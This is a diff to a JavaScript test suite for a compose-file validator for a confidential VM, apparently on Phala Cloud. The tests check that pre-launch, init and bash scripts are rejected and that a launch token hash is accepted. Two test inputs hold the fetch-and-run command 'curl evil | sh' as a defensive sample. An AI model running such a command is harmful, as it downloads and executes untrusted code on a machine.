@@ -50,6 +50,9 @@ describe('checkAppCompose', () => {
     expect(checkCompose(referenceCompose(), { pre_launch_script: 'curl evil | sh' })).toMatchObject({ error: expect.stringMatching(/pre-launch/) })
     // The image runs the seller in content-free mode, so its logs hold no prompts.
     expect(checkCompose(referenceCompose(), { public_logs: true })).not.toHaveProperty('error')
+    // Phala Cloud sets it; it only stops the CVM from booting without the matching launch token.
+    expect(checkCompose(referenceCompose(), { launch_token_hash: 'ab'.repeat(32) })).not.toHaveProperty('error')
+    expect(checkCompose(referenceCompose(), { init_script: ['curl evil | sh'] })).toMatchObject({ error: expect.stringMatching(/init_script is not allowed/) })
     expect(checkCompose(referenceCompose(), { runner: 'bash', bash_script: 'x' })).toMatchObject({ error: expect.stringMatching(/bash_script is not allowed/) })
     expect(checkCompose(referenceCompose(), { runner: 'bash' })).toMatchObject({ error: expect.stringMatching(/docker compose/) })
   })
